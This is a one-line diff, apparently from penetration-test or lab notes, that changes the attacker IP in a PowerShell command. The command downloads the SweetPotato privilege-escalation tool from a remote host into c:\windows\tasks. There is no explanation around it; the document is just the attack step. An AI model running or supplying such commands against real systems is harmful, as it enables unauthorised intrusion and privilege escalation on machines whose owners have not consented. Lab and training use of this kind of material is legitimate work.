@@ -1,1 +1,1 @@
-powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.2.2.231/tools/SweetPotato.exe','c:\windows\tasks\SweetPotato.exe')
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.2.2.153/tools/SweetPotato.exe','c:\windows\tasks\SweetPotato.exe')
